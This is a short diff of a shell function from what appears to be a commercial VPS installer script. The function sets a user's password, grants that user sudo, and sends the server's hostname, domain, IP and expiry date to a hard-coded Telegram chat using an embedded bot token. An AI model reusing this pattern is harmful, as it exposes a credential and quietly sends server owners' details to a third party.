@@ -339,6 +339,7 @@ function password_default() {
     echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
     usermod -aG sudo $Username > /dev/null 2>&1
 
+    TIMEZONE=$(printf '%(%H:%M:%S)T')
     CHATID="-1002117725897"
     KEY="6123951004:AAFMeqbK8n2HEVyCnlUKlvnFgpCpt86wbaA"
     TIME="10"
@@ -348,12 +349,15 @@ function password_default() {
        ⚠️AUTOSCRIPT PREMIUM⚠️
     ============================
     <code>Tanggal    :</code> <code>$tanggal</code>
+    <code>Tanggal    :</code> <code>$TIMEZONE</code>
     <code>Hostname   :</code> <code>${HOSTNAME}</code>
     <code>Domain     :</code> <code>$domain</code>
     <code>IP Vps     :</code> <code>$MYIP</code>
     <code>Exp Script :</code> <code>$exp</code>
     ============================
         ⚠️ By @SANAKSTORE ⚠️
+    <i>Github SanakStore</i> 
+"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/Baung2012"},{"text":"ɪɴꜱᴛᴀʟʟ🐬","url":"https://t.me/SANAKSTORE"}]]}'
     ============================
 "
 
